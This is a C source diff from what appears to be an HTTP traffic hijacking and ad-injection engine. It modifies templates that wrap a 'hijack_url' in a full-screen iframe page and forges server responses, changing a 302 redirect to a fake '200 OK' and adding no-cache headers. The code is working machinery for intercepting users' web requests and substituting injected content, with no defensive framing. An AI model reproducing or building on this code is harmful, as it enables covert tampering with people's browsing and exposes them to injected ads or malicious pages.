@@ -267,6 +267,40 @@ http_body_t default_http_body[AD_TEMPLATE_MAX] =
             "www.taobao.com",
         .tail =
             "\";\n"
+            "d.getElementById(\"m\").src=f;\n"
+            "}\n"
+            "</script>\n"
+            "<style>\n"
+            "body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
+            "a{cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#555;color:#eee;z-index:3;right:5px;top:5px;line-height:20px;text-align:center;width:20px;font-size:10px}\n"
+            "#i{display:block; position:absolute; z-index:1; width:100%; height:100%}\n"
+            "</style>\n"
+            "</head>\n"
+            "<body onLoad=u()>\n"
+            "<div id=i>\n"
+            "<iframe id=m frameborder=0 width=100% height=100%></iframe>\n" 
+            "</div>\n"
+            "</body>\n"
+            "</html>\n"
+            "\n",
+    },
+#if 0
+    {
+        .name = "pc.html",
+        .head = 
+            "<!DOCTYPE HTML>\n"
+            "<html>\n"
+            "<head>\n"
+            "<meta charset=\"utf-8\">\n"
+            "<title></title>\n"
+            "<script>\n"
+            "d=document;\n"
+            "function u(){\n"
+            "var f = \"",
+        .url =
+            "www.taobao.com",
+        .tail =
+            "\";\n"
             "d.getElementById(\"m\").src=f+(f.indexOf(\"&\")<0\?\'\?\':\'&\')+\'_tTI=tTI\';\n"
             "}\n"
             "</script>\n"
@@ -285,6 +319,7 @@ http_body_t default_http_body[AD_TEMPLATE_MAX] =
             "</html>\n"
             "\n",
     },
+#endif
 #if 1
     {
         .name = "mobile.html",
@@ -372,7 +407,7 @@ http_body_t default_http_body[AD_TEMPLATE_MAX] =
 #endif
 };
 
-uint8_t send_mode = ADT_SEND_MULTI;
+uint8_t send_mode = ADT_SEND_SINGLE;
 berr adt_get_send(uint8_t *send)
 {
     if ( NULL == send )
@@ -419,7 +454,7 @@ http_content_len_get(hytag_t *hytag)
 {
     uint16_t len = 0;
     len += http_body[hytag->template].head_len;//strlen(http_body[hytag->template].head);    
-    len += hytag->url_len;
+    len += strlen(hytag->hijack_url);
     len += http_body[hytag->template].tail_len;//strlen(http_body[hytag->template].tail);
     return len;
 }
@@ -561,8 +596,13 @@ berr ads_http_ok_head_fill(char *buf, hytag_t *hytag)
 #else
 
 
-#define HTTP_302_HEADER             "HTTP/1.1 302 Moved Temporarily\r\n"
-#define HTTP_302_SERVER             "Server: Embedthis-http\r\n"
+//#define HTTP_302_HEADER             "HTTP/1.1 302 Moved Temporarily\r\n"
+//#define HTTP_302_HEADER             "HTTP/1.1 302 Found\r\n"
+#define HTTP_302_HEADER             "HTTP/1.1 200 OK\r\n"
+
+#define HTTP_CACHE_CTRL             "Cache-Control: no-cache\r\n"
+#define HTTP_PRAGM                  "Pragma: no-cache\r\n"
+//#define HTTP_302_SERVER             "Server: Embedthis-http\r\n"
 #define HTTP_302_LOCATION           "Location: "
 #define HTTP_302_CONTENT_TYPE       "Content-Type: text/html\r\n"
 #define HTTP_302_CONTENT_LENGTH     "Content-Length: 0\r\n"
@@ -581,12 +621,13 @@ berr ads_http_302_fill(char *buf, hytag_t *hytag, char *url)
 
     //printf("%s.%d\n", __func__, __LINE__);
 #if 1
-    len += snprintf(buf+len, 2048-len, "%s%s%s%s\r\n%s%s%s", 
-        HTTP_302_HEADER, HTTP_302_SERVER, 
+    len += snprintf(buf+len, 2048-len, "%s%s%s%s%s\r\n%s%s%s", 
+        HTTP_302_HEADER, 
+        HTTP_CACHE_CTRL, HTTP_PRAGM,
         HTTP_302_LOCATION, url, HTTP_302_CONTENT_TYPE,
         HTTP_302_CONTENT_LENGTH, HTTP_302_DATE);
 #endif
-    //printf("%s.%d\n", __func__, __LINE__);
+    //printf("%s.%d, len = %d\n", __func__, __LINE__, len);
     if (len > 0)
     {
         hytag->l5_len = len;
@@ -652,7 +693,7 @@ berr ads_http_ok_head_fill(char *buf, hytag_t *hytag)
     if( adt_send_is_single())
     {
         len += snprintf(buf+len, 2048-len, "%s%s%s", 
-        http_body[hytag->template].head, hytag->url, http_body[hytag->template].tail);                
+        http_body[hytag->template].head, hytag->hijack_url, http_body[hytag->template].tail);                
     }
     hytag->l5_len = len;
     return E_SUCCESS;
